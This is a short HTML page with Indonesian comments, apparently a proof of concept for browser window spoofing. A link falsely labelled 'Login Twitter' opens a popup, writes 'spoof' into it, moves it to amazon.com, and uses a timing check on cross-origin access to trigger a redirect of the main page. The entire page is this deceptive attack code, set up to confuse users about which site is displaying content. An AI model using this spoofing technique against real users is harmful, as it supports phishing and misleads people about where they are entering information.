<script>
  function next() {
    // Setelah konten selesai dimanipulasi, arahkan ke URL lain.
    window.location.replace('http://www.google.com/csi');
  }

  function f() {
    // Membuka jendela baru kosong
    var w = window.open("about:blank", "new", "width=500,height=500");

    // Menulis konten HTML untuk menampilkan "spoof"
    w.document.write("<h1>spoof</h1>");
    
    // Menunda pengalihan ke amazon.com agar tulisan "spoof" tetap muncul
    setTimeout(function() {
      w.location = 'http://amazon.com'; // Arahkan ke amazon.com setelah 2 detik
    }, 2000);

    // Menggunakan setInterval untuk memeriksa perubahan lokasi jendela
    var i = setInterval(function() {
      try {
        // Mencoba untuk memeriksa location.href
        var x = w.location.href;
      } catch(e) {
        // Jika error terjadi (misalnya karena same-origin policy), hentikan interval dan lanjutkan
        clearInterval(i);
        next();  // Lanjutkan ke URL berikutnya
      }
    }, 100); // interval lebih cepat agar responsif
  }
</script>

<!-- Link yang memicu fungsi f() saat diklik -->
<a href="#" onclick="f()">Login Twitter</a>
